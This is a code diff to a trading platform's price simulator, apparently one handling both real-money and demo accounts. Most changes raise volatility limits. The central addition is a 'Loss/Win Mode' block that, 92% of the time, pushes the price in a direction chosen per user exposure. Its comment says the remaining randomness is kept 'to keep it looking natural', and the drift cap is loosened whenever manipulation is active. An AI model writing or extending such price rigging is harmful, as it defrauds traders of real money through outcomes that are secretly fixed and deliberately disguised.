@@ -6,7 +6,7 @@ import {
   isMarketClosedAt
 } from './marketService.ts';
 import { getIO } from './socketService.ts';
-import { tradeExposureCache } from './tradeService.ts';
+import { tradeExposureCache, manipulatedExposureCache } from './tradeService.ts';
 import { globalManipulationMode } from './marketService.ts';
 import { 
   PairMarketState, 
@@ -96,10 +96,10 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
   // 3. REGIME-BASED DRIFT & VOLATILITY COMPUTATION
   let baseSigma = (Number(m.volatility) || 0.0002) / Math.max(1e-6, currentPrice);
   // Cap baseSigma to max 0.008 per sqrt(second)
-  baseSigma = Math.min(0.008, Math.max(0.00001, baseSigma));
+  baseSigma = Math.min(0.025, Math.max(0.00001, baseSigma));
 
   let mu = state.trend || 0;
-  let volatilityMultiplier = 2.5;
+  let volatilityMultiplier = 3.5;
   let isPauseTick = false;
 
   switch (state.regime) {
@@ -111,15 +111,15 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
       break;
     }
     case 'MOMENTUM_BURST': {
-      volatilityMultiplier = 3.2 + Math.random() * 2.5;
+      volatilityMultiplier = 4.5 + Math.random() * 3.5;
       const burstDirection = state.trend >= 0 ? 1 : -1;
-      mu += burstDirection * 0.008;
+      mu += burstDirection * 0.012;
       break;
     }
     case 'VOLATILITY_SPIKE': {
-      volatilityMultiplier = 5.5 + Math.random() * 4.5;
+      volatilityMultiplier = 8.5 + Math.random() * 6.5;
       // Oscillate wildly
-      mu += (Math.random() - 0.5) * 0.012;
+      mu += (Math.random() - 0.5) * 0.025;
       break;
     }
     case 'FAKE_BREAKOUT': {
@@ -199,6 +199,22 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
     }
   }
 
+  // User-Specific Manipulation (Loss/Win Mode)
+  const manipExposureKey = `${pair}_${type}`;
+  const manipExposure = manipulatedExposureCache.get(manipExposureKey) || 0;
+  if (manipExposure !== 0) {
+    // manipExposure already accounts for the direction (loss/win) in tradeService.ts
+    // If manipExposure > 0, it means we have a 'positive' bias (price should go up)
+    // If manipExposure < 0, it means we have a 'negative' bias (price should go down)
+    
+    // Check for 92% probability to apply manipulation (up from 85%), 8% random to keep it looking natural
+    if (Math.random() < 0.92) {
+      const manipBias = manipExposure > 0 ? 1 : -1;
+      mu += manipBias * 0.12; // Much stronger push (up from 0.045)
+      volatilityMultiplier *= 0.4; // Even smoother move
+    }
+  }
+
   // News Events
   if (state.newsEvent) {
     volatilityMultiplier *= (state.newsEvent.intensity || 1.5);
@@ -218,7 +234,7 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
   // Calculate Price Multiplier
   let newPrice = currentPrice;
   if (!isPauseTick) {
-    const sigma = Math.min(0.01, Math.max(0.00001, baseSigma * volatilityMultiplier));
+    const sigma = Math.min(0.035, Math.max(0.00001, baseSigma * volatilityMultiplier));
     const u1 = Math.random() || 0.0001; 
     const u2 = Math.random();
     const dW = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2) * Math.sqrt(dt);
@@ -232,7 +248,11 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
     const clampedMomentum = Math.max(-0.015, Math.min(0.015, state.momentum));
     const momentumEffect = clampedMomentum * 0.08;
     
-    const clampedMu = Math.max(-0.03, Math.min(0.03, mu));
+    // High manipulation mu shouldn't be clamped as tightly
+    const isManipulated = manipExposure !== 0 || globalManipulationMode !== 'neutral';
+    const muCap = isManipulated ? 0.25 : 0.03;
+
+    const clampedMu = Math.max(-muCap, Math.min(muCap, mu));
     const drift = (clampedMu - 0.5 * Math.pow(sigma, 2)) * dt + targetDrift + momentumEffect;
     const shock = sigma * dW;
     const flicker = (Math.random() - 0.5) * sigma * 1.2;
